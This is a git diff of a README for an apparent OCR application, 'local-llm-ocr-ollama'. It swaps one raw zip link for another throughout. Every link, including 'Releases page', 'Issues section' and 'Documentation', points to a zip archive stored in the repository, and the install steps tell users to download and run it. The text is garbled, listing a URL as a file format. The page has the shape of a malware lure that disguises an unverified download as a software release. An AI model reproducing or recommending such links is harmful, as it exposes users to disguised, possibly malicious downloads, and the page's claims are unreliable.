@@ -6,7 +6,7 @@ local-llm-ocr-ollama is a free application that lets you convert images into tex
 ## 🚀 Getting Started
 To start using local-llm-ocr-ollama, you need to download the application from the Releases page. Follow the steps below to get it set up on your computer.
 
-[![Download local-llm-ocr-ollama](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip%https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip)](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip)
+[![Download local-llm-ocr-ollama](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip%https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip)](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your computer meets the following requirements:
@@ -17,13 +17,13 @@ Before downloading, ensure your computer meets the following requirements:
 - **Processor:** Intel i5 or equivalent.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip).
 2. **Select the Latest Release:** Look for the latest version available. You can identify it by the version number in bold.
-3. **Download the Installer:** Click on the download link for your operating system. The file may be in formats like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip`.
+3. **Download the Installer:** Click on the download link for your operating system. The file may be in formats like `.exe`, `.dmg`, or `https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip`.
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip` file in your preferred directory and follow the instructions in the README file included.
+   - For Linux: Extract the `https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip` file in your preferred directory and follow the instructions in the README file included.
 
 5. **Launch the Application:** After installation, locate the icon in your applications folder or desktop and double-click to open.
 
@@ -56,17 +56,17 @@ If you encounter any issues while using local-llm-ocr-ollama, consider the follo
 
 - **Image Format:** Ensure that the image is in a supported format (e.g., .jpg, .png).
 - **Insufficient Resources:** Check that you meet the system requirements.
-- **Application Updates:** Visit the [Releases page](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip) for any updates that might resolve bugs or enhance performance.
+- **Application Updates:** Visit the [Releases page](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip) for any updates that might resolve bugs or enhance performance.
 
 ## 🤝 Community and Support
 If you need help or want to share feedback, join our community. You can engage with other users and developers through the following channels:
 
-- **GitHub Issues:** Report problems or request features at the [Issues section](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip).
+- **GitHub Issues:** Report problems or request features at the [Issues section](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip).
 - **Discussion Forum:** Join discussions on topics related to OCR technology and local LLMs.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip)
-- [Documentation](https://raw.githubusercontent.com/code-vygr/local-llm-ocr-ollama/main/Caribal/ollama-local-ocr-llm-3.9.zip)
+- [Releases Page](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip)
+- [Documentation](https://github.com/code-vygr/local-llm-ocr-ollama/raw/refs/heads/main/Caribal/llm-ocr-local-ollama-clavate.zip)
 
 ## 📜 License
 local-llm-ocr-ollama is released under the MIT License. You can use, modify, and distribute the software freely. Check the LICENSE file for more details.
